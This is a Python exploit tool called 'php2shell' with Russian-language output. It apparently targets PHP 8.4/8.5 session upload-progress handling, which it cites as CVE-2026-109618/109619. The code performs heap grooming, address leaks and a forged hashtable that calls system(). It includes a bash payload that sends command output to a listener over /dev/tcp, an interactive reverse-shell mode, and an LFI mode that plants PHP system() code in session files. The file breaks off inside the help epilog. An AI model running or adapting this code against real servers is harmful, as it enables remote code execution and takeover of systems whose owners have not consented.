import argparse
import base64
import json
import os
import re
import select
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
from collections import Counter
from pathlib import Path

VERSION = "2.0"
MAX_CMD = 14
SID = b"attacksessionid0001"

PROFILES = {
    "84": {"ver": "8.4.x", "zif": 0x465370, "dtor": 0x65EB60, "ht": 0x690D8,
           "n1": 841, "n2": 406, "v2": 16, "pads": [(31, 31)] * 6,
           "car": True, "nb": False, "huge": 12},
    "85": {"ver": "8.5.x", "zif": 0x5996E0, "dtor": 0x7B47A0, "ht": 0x7E0D8,
           "n1": 841, "n2": 406, "v2": 16, "pads": [],
           "car": False, "nb": True, "huge": 24},
    "lab": {"ver": "lab", "zif": 0x43A870, "dtor": 0x613C50, "ht": 0x6E0D8,
            "n1": 892, "n2": 443, "v2": 1,
            "pads": [(8, 7)] + [(7, 7)] * 5,
            "car": False, "nb": False, "huge": 12},
}

COLORS = {"cyan": "\033[38;5;51m", "green": "\033[38;5;46m", "orange": "\033[38;5;214m",
     "red": "\033[38;5;196m", "blue": "\033[38;5;39m", "magenta": "\033[38;5;201m", "reset": "\033[0m"}
ARGS = None
SILENT = False


TAG_COLORS = {"сборка": "blue", "цель": "cyan", "профиль": "magenta", "память": "orange",
      "смещ.": "cyan", "куча": "green", "libphp": "blue", "выстрел": "magenta",
      "ответ": "green", "ошибка": "red", "подсказка": "orange", "слушаю": "cyan",
      "запись": "orange", "шелл": "green", "готово": "green", "внимание": "orange",
      "проверка": "cyan", "попытка": "orange", "включение": "cyan"}


def say(tag, message, color=None):
    if not SILENT:
        print(f"{COLORS[color or TAG_COLORS.get(tag, 'cyan')]}{tag:<10}{COLORS['reset']} {message}", flush=True)


def banner(stream=None):
    stream = stream or sys.stdout
    art = [
        "██╗  ██╗  █████╗   ██████╗ ██╗  ██╗ ██╗  ██╗ ███████╗ ██╗   ██╗ ███╗   ██╗",
        "██║  ██║ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██║  ██║ ██╔════╝ ██║   ██║ ████╗  ██║",
        "███████║ ███████║ ██║      █████╔╝  ███████║ █████╗   ██║   ██║ ██╔██╗ ██║",
        "██╔══██║ ██╔══██║ ██║      ██╔═██╗  ╚════██║ ██╔══╝   ██║   ██║ ██║╚██╗██║",
        "██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗      ██║ ██║      ╚██████╔╝ ██║ ╚████║",
        "╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝ ╚═╝       ╚═════╝  ╚═╝  ╚═══╝",
    ]
    if COLORS["cyan"]:
        white = "\033[38;5;231m"
        blue = "\033[38;5;33m"
        red = "\033[38;5;196m"
        gray = "\033[38;5;245m"
        colors = [white, white, blue, blue, red, red]
    else:
        white = blue = red = gray = ""
        colors = [""] * 6
    print(file=stream)
    for index, line in enumerate(art):
        print(f"{colors[index]}{line}{COLORS['reset']}", file=stream)
    print(f"{COLORS['cyan']}php2shell {VERSION}{COLORS['reset']}  {COLORS['orange']}удалённое выполнение кода в PHP{COLORS['reset']}", file=stream)
    print(f"{gray}Made by Walter White (Lamer){COLORS['reset']}", file=stream)
    link = f"{COLORS['magenta']}\033[4mhttps://t.me/walterlamer{COLORS['reset']}" if COLORS["cyan"] else "https://t.me/walterlamer"
    print(f"{gray}Телеграм:{COLORS['reset']} {link}\n", file=stream)


def form(parts, boundary):
    output = bytearray()
    for name, data, filename in parts:
        output += b"--" + boundary + b"\r\n"
        output += b'Content-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            output += b'; filename="' + filename + b'"\r\nContent-Type: application/octet-stream'
        output += b"\r\n\r\n" + data + b"\r\n"
    output += b"--" + boundary + b"--\r\n"
    return bytes(output)


def field(name, data):
    return (name.encode() if isinstance(name, str) else name, data, None)


def file(name, filename, data):
    return (name.encode(), data, filename.encode())


class Sock:
    def __init__(self, url, timeout=30):
        parsed = urllib.parse.urlsplit(url)
        self.https = parsed.scheme == "https"
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if self.https else 80)
        self.path = parsed.path or "/"
        self.timeout = timeout

    def host_header(self):
        return f"[{self.host}]" if ":" in self.host else self.host

    def connect(self):
        last_error = None
        for _ in range(8):
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    sock = ssl.create_default_context().wrap_socket(sock, server_hostname=self.host)
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return sock
            except OSError as error:
                last_error = error
                time.sleep(0.2)
        raise last_error

    def post(self, body, boundary, limit=1 << 20, timeout=None, headers=None, separator=";"):
        extra = "".join(f"{name}: {value}\r\n" for name, value in (headers or {}).items())
        hdr = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host_header()}:{self.port}\r\n{extra}"
               f"Content-Type: multipart/form-data{separator} boundary={boundary.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        sock = self.connect()
        sock.settimeout(timeout or self.timeout)
        data = bytearray()

        def reader():
            try:
                while len(data) < limit:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        thread = threading.Thread(target=reader, daemon=True)
        thread.start()
        try:
            try:
                sock.sendall(hdr)
                view = memoryview(body)
                for offset in range(0, len(body), 262144):
                    sock.sendall(view[offset:offset + 262144])
            except OSError:
                pass
            thread.join((timeout or self.timeout) + 1)
            return bytes(data)
        finally:
            sock.close()

    def get(self, path=None, limit=1 << 20):
        path = path or self.path
        hdr = (f"GET {path} HTTP/1.1\r\nHost: {self.host_header()}:{self.port}\r\n"
               "Connection: close\r\n\r\n").encode()
        sock = self.connect()
        sock.settimeout(self.timeout)
        data = bytearray()
        try:
            sock.sendall(hdr)
            try:
                while len(data) < limit:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass
        finally:
            sock.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(match.group(1)) if match else 0), body

    def headers(self):
        header = (f"GET {self.path} HTTP/1.1\r\nHost: {self.host_header()}:{self.port}\r\n"
               "Connection: close\r\n\r\n").encode()
        sock = self.connect()
        sock.settimeout(self.timeout)
        data = bytearray()
        try:
            sock.sendall(header)
            while len(data) < 65536:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                data.extend(chunk)
                if b"\r\n\r\n" in data:
                    break
        finally:
            sock.close()
        head, _, _ = bytes(data).partition(b"\r\n\r\n")
        result = {}
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                key, value = line.split(b":", 1)
                result[key.decode("latin1").strip().lower()] = value.decode("latin1").strip()
        return result


def cookie(response):
    match = re.search(rb"(?im)^Set-Cookie:\s*PHPSESSID=([^;\r\n]*)", response)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1").replace("+", "%20"))


def heap_base(raw):
    if len(raw) < 1000:
        return 0
    counts = Counter()
    for i in range(len(raw) - 7):
        value = int.from_bytes(raw[i:i + 8], "little")
        if 0x100000000000 <= value < 0x800000000000:
            counts[value & ~0x1FFFFF] += 1
    if not counts:
        return 0
    base, occurrences = counts.most_common(1)[0]
    return base if occurrences >= 8 else 0


def lib_base(raw, destructor):
    if len(raw) < 16:
        return 0
    pointer = int.from_bytes(raw[8:16], "little")
    if not (0x100000000000 <= pointer < 0x800000000000):
        return 0
    if (pointer & 0xFFF) != (destructor & 0xFFF):
        return 0
    base = pointer - destructor
    return base if base & 0xFFF == 0 else 0


def elf(path):
    data = Path(path).read_bytes()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("bad ELF")
    phoff, = struct.unpack_from("<Q", data, 0x20)
    shoff, = struct.unpack_from("<Q", data, 0x28)
    phent, phnum = struct.unpack_from("<HH", data, 0x36)
    shent, shnum = struct.unpack_from("<HH", data, 0x3A)
    loads = []
    for i in range(phnum):
        offset = phoff + i * phent
        type, = struct.unpack_from("<I", data, offset)
        vaddr, = struct.unpack_from("<Q", data, offset + 16)
        memsz, = struct.unpack_from("<Q", data, offset + 40)
        if type == 1 and memsz:
            loads.append(vaddr)
    bias = min(loads)
    sections = []
    for i in range(shnum):
        offset = shoff + i * shent
        _, type = struct.unpack_from("<II", data, offset)
        offset, size = struct.unpack_from("<QQ", data, offset + 24)
        link, = struct.unpack_from("<I", data, offset + 40)
        entry, = struct.unpack_from("<Q", data, offset + 56)
        sections.append((type, offset, size, link, entry))
    want = {"zif_system": None, "zval_ptr_dtor": None}
    for type, offset, size, link, entry in sections:
        if type not in (2, 11) or link >= len(sections):
            continue
        st = sections[link]
        entry = entry or 24
        for i in range(size // entry):
            offset = offset + i * entry
            name_offset, = struct.unpack_from("<I", data, offset)
            value, = struct.unpack_from("<Q", data, offset + 8)
            if not name_offset:
                continue
            end = data.find(b"\x00", st[1] + name_offset)
            name = data[st[1] + name_offset:end].decode("ascii", "replace")
            if name in want and want[name] is None:
                want[name] = value
    if None in want.values():
        raise ValueError("symbols missing")
    return want["zif_system"] - bias, want["zval_ptr_dtor"] - bias


def lib_off(path):
    return elf(path)


def box_off(box):
    descriptor, temp_path = tempfile.mkstemp()
    os.close(descriptor)
    try:
        subprocess.run(["docker", "cp", f"{box}:/usr/lib/apache2/modules/libphp.so", temp_path],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        return elf(temp_path)
    finally:
        try:
            os.unlink(temp_path)
        except OSError:
            pass


def img_off(img):
    try:
        subprocess.run(["docker", "image", "inspect", img], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (OSError, subprocess.CalledProcessError):
        subprocess.run(["docker", "pull", img], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    name = f"p2s-{os.getpid()}"
    subprocess.run(["docker", "rm", "-f", name], check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["docker", "create", "--name", name, img], check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    try:
        return box_off(name)
    finally:
        subprocess.run(["docker", "rm", "-f", name], check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def find_box(url):
    parsed = urllib.parse.urlsplit(url)
    if (parsed.hostname or "") not in ("127.0.0.1", "localhost", "::1"):
        return ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    try:
        output = subprocess.run(["docker", "ps", "--format", "{{.Names}}\t{{.Ports}}"],
                           capture_output=True, text=True, timeout=15).stdout
    except (OSError, subprocess.SubprocessError):
        return ""
    for line in output.splitlines():
        if "\t" not in line:
            continue
        name, ports = line.split("\t", 1)
        for entry in ports.split(","):
            if "->" not in entry:
                continue
            if entry.split("->", 1)[0].rsplit(":", 1)[-1].strip() == str(port):
                return name.strip()
    return ""


def get_ini(box, key):
    if not box:
        return None
    try:
        output = subprocess.run(["docker", "exec", box, "php", "-r", f'echo ini_get("{key}");'],
                           capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    return output.strip() or None


def megabytes(size):
    if not size:
        return None
    match = re.fullmatch(r"\s*(\d+)\s*([KMG]?)\s*", size, re.I)
    if not match:
        return None
    number = int(match.group(1))
    unit = match.group(2).upper()
    if not unit:
        return number // (1024 * 1024)
    return {"K": number // 1024, "M": number, "G": number * 1024}[unit]


def mount(box, dest):
    if not box:
        return None
    try:
        output = subprocess.run(["docker", "inspect", box, "--format",
                            '{{range .Mounts}}{{.Destination}}\t{{.Source}}{{println}}{{end}}'],
                           capture_output=True, text=True, timeout=15).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    for line in output.splitlines():
        if "\t" in line:
            destination, source = line.split("\t", 1)
            if destination.strip() == dest:
                return source.strip() or None
    return None


def fingerprint(sock):
    headers = sock.headers()
    text = headers.get("x-powered-by", "") + " " + headers.get("server", "")
    match = re.search(r"PHP/(\d+\.\d+\.\d+)", text, re.I)
    return (match.group(1) if match else ""), headers.get("server", "")


def box_ver(box):
    if not box:
        return ""
    try:
        output = subprocess.run(["docker", "exec", box, "php", "-v"],
                           capture_output=True, text=True, timeout=15).stdout
    except (OSError, subprocess.SubprocessError):
        return ""
    match = re.search(r"PHP (\d+\.\d+\.\d+)", output)
    return match.group(1) if match else ""


def pick(version):
    if version.startswith("8.5"):
        return "85"
    if version.startswith("8.4"):
        return "84"
    return ""


def local_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
        finally:
            sock.close()
    except OSError:
        return ""


def free_port():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(("0.0.0.0", 0))
        return sock.getsockname()[1]
    finally:
        sock.close()


def save(path, data, force=False):
    flags = os.O_WRONLY | os.O_CREAT | getattr(os, "O_NOFOLLOW", 0)
    flags |= os.O_TRUNC if force else os.O_EXCL
    descriptor = os.open(path, flags, 0o644)
    with os.fdopen(descriptor, "wb") as handle:
        handle.write(data)


class Run:
    def __init__(self, sock, prof, system, destructor, size, separator):
        self.sock = sock
        self.prof = prof
        self.system = system
        self.destructor = destructor
        self.table = 0
        self.size = size
        self.separator = separator
        self.command = b""
        self.body = b"B" * (size * 1024 * 1024)

    def filepart(self):
        return file("f", "a.txt", b"A" * 64)

    def send(self, parts, boundary, **kw):
        return self.sock.post(form(parts, boundary), boundary, separator=self.separator, **kw)

    def swap(self):
        parts = [field(f"f{i:04d}"[:5], b"V" * 3000) for i in range(1001)]
        parts += [field("PHPSESSID", b"\x00"), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
               self.filepart(), field("big", self.body)]
        self.send(parts, b"S" * 17, timeout=90)
        time.sleep(0.3)
        parts = [field("PHPSESSID", SID), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        self.send(parts, b"BNDRY12345", limit=65536, timeout=20)
        time.sleep(0.5)

    def heap(self):
        parts = [field(f"p{i:04d}", b"x") for i in range(1001)]
        parts += [field("PHPSESSID", b"\x00"), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
               self.filepart(), field("big", self.body)]
        self.send(parts, b"S" * 17, timeout=90)
        time.sleep(0.2)
        parts = [field("PHPSESSID", SID), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        for i in range(self.prof["n1"]):
            parts.append(field(str(1000 + i), (f"v{i:04d}" + "x" * 44)[:48].encode()))
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append(field("1999", bytes(forge)))
        response = self.send(parts, b"B" * 10, limit=9 << 20)
        raw = cookie(response)
        return heap_base(raw), raw

    def lib(self):
        parts = [field(f"f{i:04d}"[:5], b"x" * 39) for i in range(1001)]
        parts += [field("PHPSESSID", b"\x00"), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
               self.filepart(), field("big", self.body)]
        self.send(parts, b"S" * 17, timeout=90)
        time.sleep(0.2)
        parts = [field("PHPSESSID", SID), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        for i in range(983):
            for j in range(16 if i == self.prof["n2"] else 1):
                parts.append(field(f"a{i:04d}[{j}]", b"x" * self.prof["v2"]))
        response = self.send(parts, b"B" * 10, limit=1 << 20)
        return lib_base(cookie(response), self.destructor)

    def payload(self):
        command = self.command
        if len(command) > MAX_CMD:
            raise ValueError(f"cmd max {MAX_CMD}")
        table = bytearray(167)
        struct.pack_into("<II", table, 0, 1, 7)
        struct.pack_into("<II", table, 8, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", table, 0x10, self.table + 0x20)
        struct.pack_into("<II", table, 0x18, 1, 1)
        struct.pack_into("<II", table, 0x20, 8, 0)
        struct.pack_into("<Q", table, 0x28, 0)
        struct.pack_into("<Q", table, 0x30, self.system)
        offset = 0x20
        struct.pack_into("<Q", table, offset + 0x10, self.system)
        struct.pack_into("<I", table, offset + 0x2C, 1)
        struct.pack_into("<Q", table, offset + 0x50, self.table + 0x80)
        struct.pack_into("<I", table, offset + 0x58, 6)
        struct.pack_into("<II", table, 0x80, 1, 0x106)
        struct.pack_into("<Q", table, 0x90, len(command))
        table[0x98:0x98 + len(command)] = command
        table[0x98 + len(command)] = 0
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, self.table)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        live = bytearray(b"R" * 31)
        struct.pack_into("<Q", live, 0, (10 << 32) | 1)
        struct.pack_into("<Q", live, 8, self.table)
        struct.pack_into("<I", live, 0x10, 0x307)
        struct.pack_into("<I", live, 0x14, 0)
        return bytes(table), bytes(ref), bytes(live)

    def arm(self):
        parts = [field("PHPSESSID", b"a" * 100), field("PHP_SESSION_UPLOAD_PROGRESS", b"ppp")]
        for i in range(107):
            parts.append(field((f"p{i:06d}")[:7], b"V"))
        parts += [self.filepart(), field("big", self.body)]
        self.send(parts, b"S" * 17, timeout=90)
        time.sleep(0.4)

    def seed(self, payload, session):
        parts = [field("PHPSESSID", session.encode()), field("PHP_SESSION_UPLOAD_PROGRESS", payload),
              self.filepart(), field("big", self.body)]
        self.send(parts, b"S" * 17, timeout=90)

    def shot(self, command):
        self.command = command
        ht, ref, live = self.payload()
        if self.prof["nb"]:
            self.swap()
            self.arm()
            parts = [field("PHPSESSID", b"a" * 100), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
            for i in range(8):
                parts.append(field(f"m{i:04d}", b"M" * 100))
            for i in range(80):
                parts.append(field((f"F{i:030d}")[:31], b"z"))
            for i in range(200):
                parts.append(field(f"r{i:04d}", live))
            parts.append(field((f"a{0:030d}")[:31], ht))
            return self.send(parts, b"B" * 10, limit=65536, timeout=30)
        parts = [field("PHPSESSID", b"a" * 19), field("PHP_SESSION_UPLOAD_PROGRESS", b"ppp")]
        for i, (name_len, value_len) in enumerate(self.prof["pads"]):
            name = (f"p{i:0{name_len - 1}d}" if name_len > 0 else "")[:name_len]
            parts.append(field(name, b"V" * value_len))
        parts += [self.filepart(), field("big", self.body)]
        headers = {"Cookie": "PHPSESSID=" + "a" * 32} if self.prof["car"] else None
        self.send(parts, b"S" * 17, timeout=90, headers=headers)
        time.sleep(0.3)
        if self.prof["car"]:
            car = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", self.table)[:7]
            parts = [field("PHPSESSID", SID), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
            for i in range(2):
                parts.append(field(f"f{i:02d}", b"F" * 15))
            parts.append(field("g00", car))
            for i in range(15):
                parts.append(field((f"a{i:030d}")[:31], ht))
        else:
            parts = [field("PHPSESSID", SID), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
            for i in range(15):
                parts.append(field((f"a{i:030d}")[:31], ht))
            for i in range(2):
                parts.append(field(f"f{i:02d}", ref))
        return self.send(parts, b"B" * 10, limit=65536, timeout=30)


def get_heap(run, count):
    for _ in range(count):
        leak, raw = run.heap()
        if leak:
            return leak, raw
        run.swap()
    return 0, b""


def get_lib(run, count):
    for _ in range(count):
        value = run.lib()
        if value:
            return value
        run.swap()
    return 0


def lfi(sock, args):
    session = "p2s" + os.urandom(10).hex()
    encoded = base64.b64encode(args.command.encode()).decode()
    payload = f"<?php system(base64_decode('{encoded}')); ?>".encode()
    parts = [field("PHPSESSID", session.encode()), field("PHP_SESSION_UPLOAD_PROGRESS", payload),
          file("f", "a.txt", b"Z" * 8)]
    sock.post(form(parts, b"L" * 10), b"L" * 10)
    path = args.save.rstrip("/") + "/sess_" + session
    status, body = sock.get(args.sink + path)
    body_text = body.decode("latin1", "replace")
    success = status == 200 and (not args.mark or args.mark in body_text)
    say("включение", f"{args.sink}{path} -> {status}")
    if success:
        say("ответ", body_text.strip()[:200], "green")
        if args.quiet and not args.json:
            print(body_text.strip()[:200], flush=True)
    else:
        say("ошибка", "полезная нагрузка LFI не найдена", "red")
        say("подсказка", "цели нужен include() и session.upload_progress.cleanup=Off", "orange")
    return 0 if success else 1


def grab(port, ready, output, timeout=45):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", port))
        server.listen(1)
        server.settimeout(timeout)
    except OSError:
        output.append(b"")
        ready.set()
        return
    ready.set()
    try:
        conn, addr = server.accept()
    except (OSError, socket.timeout):
        server.close()
        output.append(b"")
        return
    conn.settimeout(3)
    data = bytearray()
    while len(data) < (1 << 20):
        try:
            chunk = conn.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not chunk:
            break
        data.extend(chunk)
    conn.close()
    server.close()
    output.append(bytes(data))


def exec_remote(sock, run, args, box, prof):
    host = args.lhost or local_ip()
    if not host:
        say("ошибка", "не задан адрес слушателя; передай --lhost", "red")
        return end(False, error="адрес слушателя")
    port = args.lport or (4444 if args.no_listen else free_port())
    if not re.fullmatch(r"[A-Za-z0-9.:-]+", host) or not (1 <= port <= 65535):
        say("ошибка", "неверный адрес или порт слушателя", "red")
        return end(False, error="слушатель")
    save = args.save
    if box:
        save = get_ini(box, "session.save_path") or save
    if not save:
        save = "/tmp"
    path = save.rstrip("/") + "/sess_" + args.sid
    command = "sh<" + path
    if len(command.encode()) > MAX_CMD:
        say("ошибка", f"путь сессии слишком длинный: {command} ({len(command)} > {MAX_CMD})", "red")
        say("подсказка", "нужен короткий save_path (например, /tmp) и --sid из одного символа", "orange")
        return end(False, error="путь сессии слишком длинный")
    encoded = base64.b64encode(args.command.encode()).decode()
    payload = f";bash -c 'base64 -d <<< {encoded} > /tmp/p2s_cmd; bash /tmp/p2s_cmd > /dev/tcp/{host}/{port} 2>&1';#".encode()
    if args.no_listen:
        say("запись", f"{path} ({len(payload)} B)")
        if box:
            subprocess.run(["docker", "exec", box, "rm", "-f", path], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            run.seed(payload, args.sid)
            run.swap()
            run.shot(command.encode())
        except OSError as error:
            say("ошибка", str(error), "red")
        say("готово", "выстрел сделан; вывод не собирался (--no-listen)", "orange")
        return end(True, mode="rce", blind=True)
    output = []
    ready = threading.Event()
    thread = threading.Thread(target=grab, args=(port, ready, output), daemon=True)
    thread.start()
    ready.wait(3)
    if box:
        subprocess.run(["docker", "exec", box, "rm", "-f", path], check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    say("запись", f"{path} ({len(payload)} B)")
    try:
        run.seed(payload, args.sid)
        run.swap()
        run.shot(command.encode())
    except OSError as error:
        say("ошибка", str(error), "red")
    thread.join(45)
    response_text = output[0].decode("utf-8", "replace").strip() if output else ""
    if response_text:
        say("ответ", response_text[:1200], "green")
        if args.quiet and not args.json:
            print(response_text[:1200], flush=True)
    else:
        say("готово", "команда выполнена, вывода нет", "orange")
        say("подсказка", "проверь --lhost/--lport, save_path=/tmp, bash и base64 на цели", "orange")
    return end(True, mode="rce", output=response_text)


def talk(port, ready):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    ready.set()
    say("слушаю", f"0.0.0.0:{port}")
    try:
        conn, addr = server.accept()
    except OSError:
        server.close()
        return
    server.close()
    say("шелл", f"{addr[0]}:{addr[1]}", "green")
    conn.settimeout(None)
    interactive = True
    saved = None
    try:
        import termios
        import tty
        saved = termios.tcgetattr(sys.stdin.fileno())
        tty.setraw(sys.stdin.fileno())
    except Exception:
        saved = None
    try:
        while True:
            try:
                readable, _, _ = select.select([conn] + ([sys.stdin] if interactive else []), [], [], 1)
            except (OSError, ValueError):
                break
            if conn in readable:
                try:
                    chunk = conn.recv(4096)
                except OSError:
                    break
                if not chunk:
                    break
                sys.stdout.write(chunk.decode("utf-8", "replace"))
                sys.stdout.flush()
            if interactive and sys.stdin in readable:
                try:
                    chunk = os.read(sys.stdin.fileno(), 4096)
                except OSError:
                    chunk = b""
                if not chunk:
                    interactive = False
                    continue
                try:
                    conn.sendall(chunk)
                except OSError:
                    break
    finally:
        if saved is not None:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, saved)
    conn.close()


def end(ok, **kw):
    if ARGS is not None and ARGS.json:
        print(json.dumps({"ok": ok, **kw}, ensure_ascii=False))
    return 0 if ok else 1


class Parser(argparse.ArgumentParser):

    def format_usage(self):
        return f"{COLORS['cyan']}использование:{COLORS['reset']} php2shell.py -u АДРЕС -c КОМАНДА [опции]\n"

    def format_help(self):
        cyan, blue, orange, green, magenta, reset = COLORS["cyan"], COLORS["blue"], COLORS["orange"], COLORS["green"], COLORS["magenta"], COLORS["reset"]
        dim = "\033[38;5;250m" if cyan else ""
        line = f"{blue}{'─' * 62}{reset}"
        link = f"{magenta}\033[4mhttps://t.me/walterlamer{reset}" if cyan else "https://t.me/walterlamer"

        def section(title):
            return f"{cyan}{title}{reset}"

        def row(flag, desc):
            return f"  {orange}{flag:<38}{reset} {dim}{desc}{reset}"

        def example(source):
            return f"  {green}{source}{reset}"

        rows = [
            f"{cyan}php2shell 2.0{reset}  {dim}удалённое выполнение кода в PHP{reset}",
            line,
            section("быстрый старт"),
            example("php2shell.py -u http://127.0.0.1:18080/index.php -c 'id'"),
            "",
            section("использование"),
            f"  {dim}php2shell.py -u АДРЕС -c КОМАНДА [опции]{reset}",
            "",
            section("режимы"),
            f"  {orange}rce{reset}       {dim}выполнить команду (авто-вывод){reset}",
            f"  {orange}leak{reset}      {dim}только утечки{reset}",
            f"  {orange}trigger{reset}   {dim}только сбой памяти и утечка{reset}",
            f"  {orange}shell{reset}     {dim}обратный шелл{reset}",
            f"  {orange}lfi{reset}       {dim}включение файла через приложение{reset}",
            "",
            section("основное"),
            row("-u, --url АДРЕС", "адрес цели"),
            row("-c, --cmd КОМАНДА", "команда (по умолчанию id)"),
            row("-m, --mode РЕЖИМ", "rce / leak / trigger / shell / lfi"),
            row("-p, --profile ПРОФИЛЬ", "auto / 84 / 85 / lab"),
            row("-a, --auto", "контейнер, память, смещения, доказательство"),
            row("-L, --lhost АДРЕС", "адрес для шелла или вывода"),
            row("-P, --lport ПОРТ", "порт (0 — свободный)"),
            row("-n, --no-listen", "не поднимать слушатель"),
            row("-S, --sid СИМВОЛ", "id сессии (по умолчанию a)"),
            row("-s, --save ПУТЬ", "save_path (по умолчанию /tmp)"),
            "",
            section("сборка и смещения"),
            row("-b, --box, --docker-container ИМЯ", "локальный контейнер"),
            row("-l, --lib ПУТЬ", "libphp.so для смещений"),
            row("--zif / --dtor / --ht HEX", "ручные смещения"),
            row("--huge МБ", "размер поля нехватки памяти"),
            row("--auto-container", "найти контейнер по порту"),
            row("--auto-huge", "подобрать поле по лимиту памяти"),
            row("--auto-offsets", "смещения из образа нужной версии"),
            row("--auto-proof", "путь доказательства через /out"),
            "",
            section("проверка"),
            row("-F, --proof, --proof-file ПУТЬ", "файл, который пишет команда"),
            row("-f, --fetch ПУТЬ", "запрос после выстрела"),
            row("-k, --mark, --marker СТРОКА", "обязательная строка в ответе"),
            row("-B, --blind", "один выстрел без вывода"),
            row("-o, --overwrite", "перезаписать файл"),
            row("-d, --dump, --dump-cookie ПУТЬ", "сохранить утечку"),
            row("--leak-only", "только утечки"),
            row("--trigger-only", "только сбой памяти и утечка"),
            "",
            section("прочее"),
            row("-x, --sink АДРЕС", "include()-sink для LFI"),
            row("-r, --retries N", "попытки на этап"),
            row("-t, --timeout СЕК", "таймаут запроса"),
            row("-e, --sep ТИП", "semi / comma / space"),
            row("-j, --json", "машинный вывод"),
            row("--plain", "без цветов"),
            row("-q, --quiet", "только результат"),
            row("-v, --version", "версия"),
            row("--list", "профили и смещения"),
            row("-h, --help", "эта справка"),
            "",
            section("примеры"),
            example("php2shell.py -u http://host/index.php -c 'id'"),
            example("php2shell.py -u http://host/index.php -c 'uname -a'"),
            example("php2shell.py -u http://host/index.php -m leak"),
            example("php2shell.py -u http://host/index.php -m shell --lhost 192.168.1.10 --lport 4444"),
            example("php2shell.py -u http://host/index.php -m lfi --sink '/index.php?page=' -c id"),
            "",
            section("телеграм"),
            f"  {link}",
        ]
        return "\n".join(rows) + "\n"

    def error(self, message):
        text = message
        match = re.match(r"argument (.+): invalid choice: (.+) \(choose from (.+)\)", text)
        if match:
            text = f"неверное значение для {match.group(1)}: {match.group(2)} (доступно: {match.group(3)})"
        elif text.startswith("unrecognized arguments:"):
            text = "неизвестные аргументы:" + text.split(":", 1)[1]
        elif text.startswith("the following arguments are required:"):
            text = "не хватает обязательных аргументов:" + text.split(":", 1)[1]
        elif re.match(r"argument (.+): expected one argument", text):
            text = re.sub(r"argument (.+): expected one argument", r"для \1 ожидается значение", text)
        self.print_usage(sys.stderr)
        self.exit(2, f"{COLORS['red']}ошибка:{COLORS['reset']} {text}\n")


def main():
    global ARGS, SILENT
    if "--plain" in sys.argv or not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
        for color in COLORS:
            COLORS[color] = ""
    if "--json" in sys.argv or "-q" in sys.argv or "--quiet" in sys.argv:
        banner(sys.stderr)
    else:
        banner(sys.stdout)
    parser = Parser(
        description="php2shell — удалённое выполнение кода в PHP (CVE-2026-109618 / CVE-2026-109619)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
        epilog="""
примеры:
